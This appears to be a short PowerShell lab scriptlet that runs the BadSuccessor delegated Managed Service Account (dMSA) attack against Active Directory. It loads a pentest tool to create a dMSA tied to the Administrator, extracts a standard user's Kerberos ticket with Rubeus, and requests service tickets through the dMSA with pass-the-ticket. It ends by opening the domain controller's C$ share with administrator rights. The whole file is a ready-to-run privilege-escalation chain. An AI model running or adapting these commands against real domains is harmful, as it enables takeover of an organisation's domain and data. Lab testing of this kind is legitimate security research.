# Scriptlet to experiment with dMSA
. ..\..\Scripts\Pentest-Tools-Collection\Tools\ActiveDirectory\BadSuccessor.ps1
Set-Location c:\Scripts\Rubeus\
Clear-Host
klist purge

# Lock VM and re-login

klist
$name = 'SU-GAAll'

$path = 'OU=dMSAs,OU=Misconfigs,DC=domain,DC=root'
$delegatedadmin = 'StandardUser'
$delegatetarget = 'Administrator'
$domain = 'domain.root'

# Create dMSA
BadSuccessor -mode exploit -Path $path -Name $name -DelegatedAdmin $delegatedadmin -DelegateTarget $delegatetarget -domain $domain

# Try to view domain controller share as StandardUser
ls \\InheritanceII.domain.root\c$

# Get TGT for "StandardUser"
.\Rubeus.exe tgtdeleg /nowrap /outfile:sutgt.kirbi # Outfile doesn't seem to work here
$b64 = Get-Clipboard
$bytea = [Convert]::FromBase64String($b64)
[IO.File]::WriteAllBytes("C:\Scripts\Rubeus\sutgt.kirbi", $bytea)
# Request TGS for dMSA account
.\Rubeus.exe asktgs /targetuser:$($name)$ /service:krbtgt/$domain /opsec /dmsa /nowrap /ptt /ticket:sutgt.kirbi /outfile:dMSA.kirbi

# then request a tgs for a desired service as our targeted user (Administrator in that case):
.\Rubeus.exe asktgs /user:$($name)$ /service:cifs/inheritanceII.domain.root /opsec /dmsa /nowrap /ptt /ticket:dMSA.kirbi /outfile:administrator.kirbi

klist

# Try to view domain controller share under context of dMSA
ls \\InheritanceII.domain.root\c$